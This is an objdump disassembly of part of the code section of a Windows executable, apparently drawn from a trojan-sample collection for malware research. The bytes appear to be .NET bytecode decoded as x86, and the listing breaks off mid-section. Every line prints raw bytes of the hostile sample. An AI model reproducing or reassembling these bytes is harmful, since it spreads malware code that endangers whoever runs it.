
malware_samples/trojan/ea54271db6fbfe6616049dc6855a18bf4a957ea9156502e65766782159f92ead.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	f0 cc                	lock int3
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 20 57 00    	add    %al,0x572000
  402013:	00 98 75 00 00 01    	add    %bl,0x1000075(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	1a 00                	sbb    (%eax),%al
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 12                	jle    0x402095
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 12 00 00 04    	add    0x4000012(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 13                	jle    0x4020a5
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 14                	jle    0x4020b5
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 15                	jle    0x4020c5
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 16                	jle    0x4020d5
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 17                	jle    0x4020e5
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 18                	jle    0x4020f5
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 19                	jle    0x402105
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1a             	sbb    0x1a(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1b                	jle    0x40211d
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  40210d:	2a 2a                	sub    (%edx),%ch
  40210f:	02 28                	add    (%eax),%ch
  402111:	3e 00 00             	add    %al,%ds:(%eax)
  402114:	0a 16                	or     (%esi),%dl
  402116:	fe 03                	incb   (%ebx)
  402118:	2a 32                	sub    (%edx),%dh
  40211a:	7e 0b                	jle    0x402127
  40211c:	00 00                	add    %al,(%eax)
  40211e:	04 03                	add    $0x3,%al
  402120:	6f                   	outsl  %ds:(%esi),(%dx)
  402121:	3f                   	aas
  402122:	00 00                	add    %al,(%eax)
  402124:	0a 2a                	or     (%edx),%ch
  402126:	36 28 17             	sub    %dl,%ss:(%edi)
  402129:	00 00                	add    %al,(%eax)
  40212b:	06                   	push   %es
  40212c:	17                   	pop    %ss
  40212d:	58                   	pop    %eax
  40212e:	28 18                	sub    %bl,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	06                   	push   %es
  402133:	2a 2e                	sub    (%esi),%ch
  402135:	73 1a                	jae    0x402151
  402137:	00 00                	add    %al,(%eax)
  402139:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  40213f:	2a 32                	sub    (%edx),%dh
  402141:	7e 1c                	jle    0x40215f
  402143:	00 00                	add    %al,(%eax)
  402145:	04 02                	add    $0x2,%al
  402147:	6f                   	outsl  %ds:(%esi),(%dx)
  402148:	21 00                	and    %eax,(%eax)
  40214a:	00 0a                	add    %cl,(%edx)
  40214c:	2a 32                	sub    (%edx),%dh
  40214e:	7e 1c                	jle    0x40216c
  402150:	00 00                	add    %al,(%eax)
  402152:	04 02                	add    $0x2,%al
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  40215a:	32 02                	xor    (%edx),%al
  40215c:	28 56 00             	sub    %dl,0x0(%esi)
  40215f:	00 0a                	add    %cl,(%edx)
  402161:	28 26                	sub    %ah,(%esi)
  402163:	00 00                	add    %al,(%eax)
  402165:	06                   	push   %es
  402166:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  40216c:	00 01                	add    %al,(%ecx)
  40216e:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402173:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402178:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  40217f:	63 d2                	arpl   %edx,%edx
  402181:	9c                   	pushf
  402182:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402187:	63 d2                	arpl   %edx,%edx
  402189:	9c                   	pushf
  40218a:	2a 4e 18             	sub    0x18(%esi),%cl
  40218d:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402191:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  402197:	25 16 02 1e 63       	and    $0x631e0216,%eax
  40219c:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 28                	or     (%eax),%ch
  4021a7:	26 00 00             	add    %al,%es:(%eax)
  4021aa:	06                   	push   %es
  4021ab:	2a 2e                	sub    (%esi),%ch
  4021ad:	73 58                	jae    0x402207
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  4021b7:	2a 56 02             	sub    0x2(%esi),%dl
  4021ba:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  4021bf:	04 02                	add    $0x2,%al
  4021c1:	28 1a                	sub    %bl,(%edx)
  4021c3:	00 00                	add    %al,(%eax)
  4021c5:	0a 02                	or     (%edx),%al
  4021c7:	03 7d 1d             	add    0x1d(%ebp),%edi
  4021ca:	00 00                	add    %al,(%eax)
  4021cc:	04 2a                	add    $0x2a,%al
  4021ce:	4a                   	dec    %edx
  4021cf:	02 7b 1d             	add    0x1d(%ebx),%bh
  4021d2:	00 00                	add    %al,(%eax)
  4021d4:	04 02                	add    $0x2,%al
  4021d6:	7b 1e                	jnp    0x4021f6
  4021d8:	00 00                	add    %al,(%eax)
  4021da:	04 6f                	add    $0x6f,%al
  4021dc:	59                   	pop    %ecx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	0a 2a                	or     (%edx),%ch
  4021e1:	8a 02                	mov    (%edx),%al
  4021e3:	02 7b 1e             	add    0x1e(%ebx),%bh
  4021e6:	00 00                	add    %al,(%eax)
  4021e8:	04 17                	add    $0x17,%al
  4021ea:	58                   	pop    %eax
  4021eb:	7d 1e                	jge    0x40220b
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	04 02                	add    $0x2,%al
  4021f1:	7b 1e                	jnp    0x402211
  4021f3:	00 00                	add    %al,(%eax)
  4021f5:	04 02                	add    $0x2,%al
  4021f7:	7b 1d                	jnp    0x402216
  4021f9:	00 00                	add    %al,(%eax)
  4021fb:	04 6f                	add    $0x6f,%al
  4021fd:	5a                   	pop    %edx
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a fe                	or     %dh,%bh
  402202:	04 2a                	add    $0x2a,%al
  402204:	22 02                	and    (%edx),%al
  402206:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  40220b:	04 2a                	add    $0x2a,%al
  40220d:	56                   	push   %esi
  40220e:	02 28                	add    (%eax),%ch
  402210:	1a 00                	sbb    (%eax),%al
  402212:	00 0a                	add    %cl,(%edx)
  402214:	02 03                	add    (%ebx),%al
  402216:	7d 20                	jge    0x402238
  402218:	00 00                	add    %al,(%eax)
  40221a:	04 02                	add    $0x2,%al
  40221c:	04 7d                	add    $0x7d,%al
  40221e:	1f                   	pop    %ds
  40221f:	00 00                	add    %al,(%eax)
  402221:	04 2a                	add    $0x2a,%al
  402223:	32 02                	xor    (%edx),%al
  402225:	7b 20                	jnp    0x402247
  402227:	00 00                	add    %al,(%eax)
  402229:	04 6f                	add    $0x6f,%al
  40222b:	3f                   	aas
  40222c:	00 00                	add    %al,(%eax)
  40222e:	06                   	push   %es
  40222f:	2a 4e 02             	sub    0x2(%esi),%cl
  402232:	7b 20                	jnp    0x402254
  402234:	00 00                	add    %al,(%eax)
  402236:	04 6f                	add    $0x6f,%al
  402238:	3f                   	aas
  402239:	00 00                	add    %al,(%eax)
  40223b:	06                   	push   %es
  40223c:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402241:	00 06                	add    %al,(%esi)
  402243:	2a 4e 02             	sub    0x2(%esi),%cl
  402246:	7b 20                	jnp    0x402268
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 6f                	add    $0x6f,%al
  40224c:	3f                   	aas
  40224d:	00 00                	add    %al,(%eax)
  40224f:	06                   	push   %es
  402250:	25 03 6f 42 00       	and    $0x426f03,%eax
  402255:	00 06                	add    %al,(%esi)
  402257:	2a 4e 02             	sub    0x2(%esi),%cl
  40225a:	7b 20                	jnp    0x40227c
  40225c:	00 00                	add    %al,(%eax)
  40225e:	04 6f                	add    $0x6f,%al
  402260:	3f                   	aas
  402261:	00 00                	add    %al,(%eax)
  402263:	06                   	push   %es
  402264:	25 03 6f 53 00       	and    $0x536f03,%eax
  402269:	00 06                	add    %al,(%esi)
  40226b:	2a 36                	sub    (%esi),%dh
  40226d:	02 7b 1f             	add    0x1f(%ebx),%bh
  402270:	00 00                	add    %al,(%eax)
  402272:	04 03                	add    $0x3,%al
  402274:	6f                   	outsl  %ds:(%esi),(%dx)
  402275:	59                   	pop    %ecx
  402276:	00 00                	add    %al,(%eax)
  402278:	0a 2a                	or     (%edx),%ch
  40227a:	32 02                	xor    (%edx),%al
  40227c:	7b 1f                	jnp    0x40229d
  40227e:	00 00                	add    %al,(%eax)
  402280:	04 6f                	add    $0x6f,%al
  402282:	5a                   	pop    %edx
  402283:	00 00                	add    %al,(%eax)
  402285:	0a 2a                	or     (%edx),%ch
  402287:	66 02 03             	data16 add (%ebx),%al
  40228a:	7d 21                	jge    0x4022ad
  40228c:	00 00                	add    %al,(%eax)
  40228e:	04 02                	add    $0x2,%al
  402290:	02 7b 21             	add    0x21(%ebx),%bh
  402293:	00 00                	add    %al,(%eax)
  402295:	04 6f                	add    $0x6f,%al
  402297:	5b                   	pop    %ebx
  402298:	00 00                	add    %al,(%eax)
  40229a:	0a 7d 22             	or     0x22(%ebp),%bh
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 2a                	add    $0x2a,%al
  4022a1:	76 02                	jbe    0x4022a5
  4022a3:	7b 24                	jnp    0x4022c9
  4022a5:	00 00                	add    %al,(%eax)
  4022a7:	04 18                	add    $0x18,%al
  4022a9:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022af:	00 06                	add    %al,(%esi)
  4022b1:	02 18                	add    (%eax),%bl
  4022b3:	7d 24                	jge    0x4022d9
  4022b5:	00 00                	add    %al,(%eax)
  4022b7:	04 02                	add    $0x2,%al
  4022b9:	28 3a                	sub    %bh,(%edx)
  4022bb:	00 00                	add    %al,(%eax)
  4022bd:	06                   	push   %es
  4022be:	2a 76 02             	sub    0x2(%esi),%dh
  4022c1:	7b 24                	jnp    0x4022e7
  4022c3:	00 00                	add    %al,(%eax)
  4022c5:	04 19                	add    $0x19,%al
  4022c7:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  4022cd:	00 06                	add    %al,(%esi)
  4022cf:	02 19                	add    (%ecx),%bl
  4022d1:	7d 24                	jge    0x4022f7
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	04 02                	add    $0x2,%al
  4022d7:	28 3a                	sub    %bh,(%edx)
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	06                   	push   %es
  4022dc:	2a 1e                	sub    (%esi),%bl
  4022de:	02 28                	add    (%eax),%ch
  4022e0:	3e 00 00             	add    %al,%ds:(%eax)
  4022e3:	06                   	push   %es
  4022e4:	2a 52 02             	sub    0x2(%edx),%dl
  4022e7:	03 8c 51 00 00 01 7d 	add    0x7d010000(%ecx,%edx,2),%ecx
  4022ee:	23 00                	and    (%eax),%eax
  4022f0:	00 04 02             	add    %al,(%edx,%eax,1)
  4022f3:	1b 7d 24             	sbb    0x24(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	52                   	push   %edx
  4022fb:	02 03                	add    (%ebx),%al
  4022fd:	8c 52 00             	mov    %ss,0x0(%edx)
  402300:	00 01                	add    %al,(%ecx)
  402302:	7d 23                	jge    0x402327
  402304:	00 00                	add    %al,(%eax)
  402306:	04 02                	add    $0x2,%al
  402308:	1c 7d                	sbb    $0x7d,%al
  40230a:	24 00                	and    $0x0,%al
  40230c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40230f:	42                   	inc    %edx
  402310:	02 03                	add    (%ebx),%al
  402312:	7d 23                	jge    0x402337
  402314:	00 00                	add    %al,(%eax)
  402316:	04 02                	add    $0x2,%al
  402318:	1f                   	pop    %ds
  402319:	0b 7d 24             	or     0x24(%ebp),%edi
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 2a                	add    $0x2a,%al
  402320:	52                   	push   %edx
  402321:	02 28                	add    (%eax),%ch
  402323:	3e 00 00             	add    %al,%ds:(%eax)
  402326:	06                   	push   %es
  402327:	25 03 7d 21 00       	and    $0x217d03,%eax
  40232c:	00 04 04             	add    %al,(%esp,%eax,1)
  40232f:	6f                   	outsl  %ds:(%esi),(%dx)
  402330:	4f                   	dec    %edi
  402331:	00 00                	add    %al,(%eax)
  402333:	06                   	push   %es
  402334:	2a 56 02             	sub    0x2(%esi),%dl
  402337:	28 3e                	sub    %bh,(%esi)
  402339:	00 00                	add    %al,(%eax)
  40233b:	06                   	push   %es
  40233c:	25 03 7d 21 00       	and    $0x217d03,%eax
  402341:	00 04 04             	add    %al,(%esp,%eax,1)
  402344:	6a 6f                	push   $0x6f
  402346:	42                   	inc    %edx
  402347:	00 00                	add    %al,(%eax)
  402349:	06                   	push   %es
  40234a:	2a f6                	sub    %dh,%dh
  40234c:	02 7b 23             	add    0x23(%ebx),%bh
  40234f:	00 00                	add    %al,(%eax)
  402351:	04 2c                	add    $0x2c,%al
  402353:	33 03                	xor    (%ebx),%eax
  402355:	1c 73                	sbb    $0x73,%al
  402357:	77 00                	ja     0x402359
  402359:	00 0a                	add    %cl,(%edx)
  40235b:	25 02 7b 23 00       	and    $0x237b02,%eax
  402360:	00 04 74             	add    %al,(%esp,%esi,2)
  402363:	03 00                	add    (%eax),%eax
  402365:	00 1b                	add    %bl,(%ebx)
  402367:	16                   	push   %ss
  402368:	02 7b 23             	add    0x23(%ebx),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 74                	add    $0x74,%al
  40236f:	03 00                	add    (%eax),%eax
  402371:	00 1b                	add    %bl,(%ebx)
  402373:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402376:	4c                   	dec    %esp
  402377:	00 00                	add    %al,(%eax)
  402379:	0a 25 6f 76 00 00    	or     0x766f,%ah
  40237f:	0a 6f 41             	or     0x41(%edi),%ch
  402382:	00 00                	add    %al,(%eax)
  402384:	0a 17                	or     (%edi),%dl
  402386:	2a 16                	sub    (%esi),%dl
  402388:	2a 56 02             	sub    0x2(%esi),%dl
  40238b:	28 39                	sub    %bh,(%ecx)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	06                   	push   %es
  402390:	02 14 7d 23 00 00 04 	add    0x4000023(,%edi,2),%dl
  402397:	02 17                	add    (%edi),%dl
  402399:	7d 24                	jge    0x4023bf
  40239b:	00 00                	add    %al,(%eax)
  40239d:	04 2a                	add    $0x2a,%al
  40239f:	3e 02 03             	add    %ds:(%ebx),%al
  4023a2:	7d 23                	jge    0x4023c7
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	04 02                	add    $0x2,%al
  4023a8:	1a 7d 24             	sbb    0x24(%ebp),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 2a                	add    $0x2a,%al
  4023af:	6a 02                	push   $0x2
  4023b1:	7b 23                	jnp    0x4023d6
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	04 2d                	add    $0x2d,%al
  4023b7:	06                   	push   %es
  4023b8:	72 bd                	jb     0x402377
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	70 2a                	jo     0x4023e8
  4023be:	02 7b 23             	add    0x23(%ebx),%bh
  4023c1:	00 00                	add    %al,(%eax)
  4023c3:	04 6f                	add    $0x6f,%al
  4023c5:	38 00                	cmp    %al,(%eax)
  4023c7:	00 0a                	add    %cl,(%edx)
  4023c9:	2a 52 02             	sub    0x2(%edx),%dl
  4023cc:	1d 7d 24 00 00       	sbb    $0x247d,%eax
  4023d1:	04 02                	add    $0x2,%al
  4023d3:	03 8c 5e 00 00 01 7d 	add    0x7d010000(%esi,%ebx,2),%ecx
  4023da:	23 00                	and    (%eax),%eax
  4023dc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023df:	56                   	push   %esi
  4023e0:	02 1f                	add    (%edi),%bl
  4023e2:	09 7d 24             	or     %edi,0x24(%ebp)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 02                	add    $0x2,%al
  4023e9:	03 8c 54 00 00 01 7d 	add    0x7d010000(%esp,%edx,2),%ecx
  4023f0:	23 00                	and    (%eax),%eax
  4023f2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4023f5:	52                   	push   %edx
  4023f6:	02 1e                	add    (%esi),%bl
  4023f8:	7d 24                	jge    0x40241e
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	03 8c 53 00 00 01 7d 	add    0x7d010000(%ebx,%edx,2),%ecx
  402405:	23 00                	and    (%eax),%eax
  402407:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40240a:	1e                   	push   %ds
  40240b:	02 28                	add    (%eax),%ch
  40240d:	50                   	push   %eax
  40240e:	00 00                	add    %al,(%eax)
  402410:	06                   	push   %es
  402411:	2a 22                	sub    (%edx),%ah
  402413:	02 03                	add    (%ebx),%al
  402415:	28 4f 00             	sub    %cl,0x0(%edi)
  402418:	00 06                	add    %al,(%esi)
  40241a:	2a 1e                	sub    (%esi),%bl
  40241c:	02 28                	add    (%eax),%ch
  40241e:	45                   	inc    %ebp
  40241f:	00 00                	add    %al,(%eax)
  402421:	06                   	push   %es
  402422:	2a 22                	sub    (%edx),%ah
  402424:	02 03                	add    (%ebx),%al
  402426:	28 42 00             	sub    %al,0x0(%edx)
  402429:	00 06                	add    %al,(%esi)
  40242b:	2a 1e                	sub    (%esi),%bl
  40242d:	02 28                	add    (%eax),%ch
  40242f:	46                   	inc    %esi
  402430:	00 00                	add    %al,(%eax)
  402432:	06                   	push   %es
  402433:	2a 22                	sub    (%edx),%ah
  402435:	02 03                	add    (%ebx),%al
  402437:	28 53 00             	sub    %dl,0x0(%ebx)
  40243a:	00 06                	add    %al,(%esi)
  40243c:	2a 1e                	sub    (%esi),%bl
  40243e:	02 7b 24             	add    0x24(%ebx),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 2a                	add    $0x2a,%al
  402445:	32 02                	xor    (%edx),%al
  402447:	7b 26                	jnp    0x40246f
  402449:	00 00                	add    %al,(%eax)
  40244b:	04 73                	add    $0x73,%al
  40244d:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  402452:	4a                   	dec    %edx
  402453:	02 73 83             	add    -0x7d(%ebx),%dh
  402456:	00 00                	add    %al,(%eax)
  402458:	0a 7d 26             	or     0x26(%ebp),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 02                	add    $0x2,%al
  40245f:	28 1a                	sub    %bl,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	0a 2a                	or     (%edx),%ch
  402465:	3a 02                	cmp    (%edx),%al
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	7a 00                	jp     0x40246a
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	d2 02                	rolb   %cl,(%edx)
  40246e:	28 65 00             	sub    %ah,0x0(%ebp)
  402471:	00 06                	add    %al,(%esi)
  402473:	2a 32                	sub    (%edx),%dh
  402475:	02 20                	add    (%eax),%ah
  402477:	c0 00 00             	rolb   $0x0,(%eax)
  40247a:	00 6f 62             	add    %ch,0x62(%edi)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	0a 2a                	or     (%edx),%ch
  402481:	6a 02                	push   $0x2
  402483:	20 cb                	and    %cl,%bl
  402485:	00 00                	add    %al,(%eax)
  402487:	00 6f 62             	add    %ch,0x62(%edi)
  40248a:	00 00                	add    %al,(%eax)
  40248c:	0a 02                	or     (%edx),%al
  40248e:	03 28                	add    (%eax),%ebp
  402490:	2a 00                	sub    (%eax),%al
  402492:	00 06                	add    %al,(%esi)
  402494:	16                   	push   %ss
  402495:	1e                   	push   %ds
  402496:	6f                   	outsl  %ds:(%esi),(%dx)
  402497:	4c                   	dec    %esp
  402498:	00 00                	add    %al,(%eax)
  40249a:	0a 2a                	or     (%edx),%ch
  40249c:	7e 02                	jle    0x4024a0
  40249e:	20 ca                	and    %cl,%dl
  4024a0:	00 00                	add    %al,(%eax)
  4024a2:	00 6f 62             	add    %ch,0x62(%edi)
  4024a5:	00 00                	add    %al,(%eax)
  4024a7:	0a 02                	or     (%edx),%al
  4024a9:	03 28                	add    (%eax),%ebp
  4024ab:	71 00                	jno    0x4024ad
  4024ad:	00 0a                	add    %cl,(%edx)
  4024af:	28 26                	sub    %ah,(%esi)
  4024b1:	00 00                	add    %al,(%eax)
  4024b3:	06                   	push   %es
  4024b4:	16                   	push   %ss
  4024b5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	0a 2a                	or     (%edx),%ch
  4024bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4024bd:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  4024c0:	02 20                	add    (%eax),%ah
  4024c2:	c3                   	ret
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 6f 62             	add    %ch,0x62(%edi)
  4024c8:	00 00                	add    %al,(%eax)
  4024ca:	0a 2a                	or     (%edx),%ch
  4024cc:	02 20                	add    (%eax),%ah
  4024ce:	c2 00 00             	ret    $0x0
  4024d1:	00 6f 62             	add    %ch,0x62(%edi)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	0a 2a                	or     (%edx),%ch
  4024d8:	aa                   	stos   %al,%es:(%edi)
  4024d9:	28 75 00             	sub    %dh,0x0(%ebp)
  4024dc:	00 06                	add    %al,(%esi)
  4024de:	2d 1c 28 76 00       	sub    $0x76281c,%eax
  4024e3:	00 06                	add    %al,(%esi)
  4024e5:	2d 15 28 77 00       	sub    $0x772815,%eax
  4024ea:	00 06                	add    %al,(%esi)
  4024ec:	2d 0e 28 73 00       	sub    $0x73280e,%eax
  4024f1:	00 06                	add    %al,(%esi)
  4024f3:	2d 07 28 74 00       	sub    $0x742807,%eax
  4024f8:	00 06                	add    %al,(%esi)
  4024fa:	2c 06                	sub    $0x6,%al
  4024fc:	14 28                	adc    $0x28,%al
  4024fe:	a9 00 00 0a 2a       	test   $0x2a0a0000,%eax
  402503:	56                   	push   %esi
  402504:	28 d0                	sub    %dl,%al
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40250b:	00 00                	add    %al,(%eax)
  40250d:	0a 20                	or     (%eax),%ah
  40250f:	20 02                	and    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	d2 00                	rolb   %cl,(%eax)
  402516:	00 0a                	add    %cl,(%edx)
  402518:	2a 62 7e             	sub    0x7e(%edx),%ah
  40251b:	39 00                	cmp    %eax,(%eax)
  40251d:	00 04 2c             	add    %al,(%esp,%ebp,1)
  402520:	10 7e 39             	adc    %bh,0x39(%esi)
  402523:	00 00                	add    %al,(%eax)
  402525:	04 6f                	add    $0x6f,%al
  402527:	df 00                	filds  (%eax)
  402529:	00 0a                	add    %cl,(%edx)
  40252b:	14 80                	adc    $0x80,%al
  40252d:	39 00                	cmp    %eax,(%eax)
  40252f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402532:	66 7e 0f             	data16 jle 0x402544
  402535:	00 00                	add    %al,(%eax)
  402537:	04 28                	add    $0x28,%al
  402539:	17                   	pop    %ss
  40253a:	00 00                	add    %al,(%eax)
  40253c:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  40253f:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  402545:	05 28 8b 00 00       	add    $0x8b28,%eax
  40254a:	06                   	push   %es
  40254b:	2a 56 72             	sub    0x72(%esi),%dl
  40254e:	53                   	push   %ebx
  40254f:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  402553:	10 00                	adc    %al,(%eax)
  402555:	00 04 28             	add    %al,(%eax,%ebp,1)
  402558:	51                   	push   %ecx
  402559:	00 00                	add    %al,(%eax)
  40255b:	0a 80 3a 00 00 04    	or     0x400003a(%eax),%al
  402561:	2a be 73 62 00 00    	sub    0x6273(%esi),%bh
  402567:	06                   	push   %es
  402568:	25 72 d1 20 00       	and    $0x20d172,%eax
  40256d:	70 6f                	jo     0x4025de
  40256f:	4d                   	dec    %ebp
  402570:	00 00                	add    %al,(%eax)
  402572:	06                   	push   %es
  402573:	72 ff                	jb     0x402574
  402575:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  402579:	5a                   	pop    %edx
  40257a:	00 00                	add    %al,(%eax)
  40257c:	06                   	push   %es
  40257d:	6f                   	outsl  %ds:(%esi),(%dx)
  40257e:	57                   	push   %edi
  40257f:	00 00                	add    %al,(%eax)
  402581:	06                   	push   %es
  402582:	28 1e                	sub    %bl,(%esi)
  402584:	00 00                	add    %al,(%eax)
  402586:	06                   	push   %es
  402587:	20 e8                	and    %ch,%al
  402589:	03 00                	add    (%eax),%eax
  40258b:	00 28                	add    %ch,(%eax)
  40258d:	14 00                	adc    $0x0,%al
  40258f:	00 0a                	add    %cl,(%edx)
  402591:	2a da                	sub    %dl,%bl
  402593:	73 62                	jae    0x4025f7
  402595:	00 00                	add    %al,(%eax)
  402597:	06                   	push   %es
  402598:	25 72 d1 20 00       	and    $0x20d172,%eax
  40259d:	70 6f                	jo     0x40260e
  40259f:	4d                   	dec    %ebp
  4025a0:	00 00                	add    %al,(%eax)
  4025a2:	06                   	push   %es
  4025a3:	72 11                	jb     0x4025b6
  4025a5:	27                   	daa
  4025a6:	00 70 6f             	add    %dh,0x6f(%eax)
  4025a9:	5a                   	pop    %edx
  4025aa:	00 00                	add    %al,(%eax)
  4025ac:	06                   	push   %es
  4025ad:	25 72 11 27 00       	and    $0x271172,%eax
  4025b2:	70 6f                	jo     0x402623
  4025b4:	4d                   	dec    %ebp
  4025b5:	00 00                	add    %al,(%eax)
  4025b7:	06                   	push   %es
  4025b8:	02 6f 5a             	add    0x5a(%edi),%ch
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bf:	57                   	push   %edi
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	28 1e                	sub    %bl,(%esi)
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	2a 2e                	sub    (%esi),%ch
  4025ca:	73 83                	jae    0x40254f
